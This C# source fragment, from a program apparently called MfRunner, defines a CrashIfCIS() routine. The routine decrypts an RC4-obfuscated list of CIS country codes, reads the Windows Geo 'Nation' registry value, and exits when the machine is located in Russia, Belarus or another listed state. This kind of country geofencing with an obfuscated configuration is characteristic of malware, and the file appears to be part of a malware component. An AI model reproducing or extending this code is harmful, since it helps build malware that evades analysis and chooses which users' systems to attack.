using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
#if BLACKLIST_CIS
        public static void CrashIfCIS()
        {
            // Azerbaijan, Armenia, Belarus,    Kyrgyzstan,   Kazakhstan
            // Moldova,    Russia,  Tajikistan, Turkmenistan, Uzbekistan
            
            byte[] cisCountriesList = new byte[] { 5, 7, 29, 130, 137, 152, 203, 228, 238, 247 };
            ApplyRC4(cisCountriesList, DeriveKey(SEED_CIS_COUNTRIES_LIST));

            try
            {
                object nation = Registry.CurrentUser.OpenSubKey("Control Panel\\International\\Geo").GetValue("Nation");
                if (nation != null)
                {
                    int nationInt = 0;
                    int.TryParse((string)nation, out nationInt);
                    if (nationInt != 0 && nationInt < 256)
                    {
                        //Console.WriteLine("> Nation: {0}", nationInt);
                        if (cisCountriesList.Contains((byte)nationInt))
                        {
                            CrashExit();
                        }
                        //Console.WriteLine("> Not a CIS country");
                    }
                }
            }
            catch { }
        }
    }
#endif
}
